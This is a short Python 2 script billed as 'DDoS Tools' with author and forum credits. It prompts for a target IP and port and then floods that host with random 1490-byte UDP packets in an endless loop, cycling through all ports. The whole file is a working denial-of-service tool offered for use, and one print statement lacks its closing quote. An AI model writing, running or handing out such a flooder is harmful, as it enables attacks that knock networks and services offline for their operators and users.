import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Tools")

print
print "Author   : PuakaX"
print "Forum    : https://qimiehensem.cf"
print "github   : https://github.com/qimiekekes"
print "----------*This Tools Coded By PuakaX*---------------"
print "figlet DDoS Tools"

ip = raw_input("Enter IP Target : ")
port = input  ("Enter Port      : ")

os.system("clear")
os.system("figlet Attacking")
print "figlet Processing...
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught Port"%(sent,ip)
     if port == 65534:
       port = 1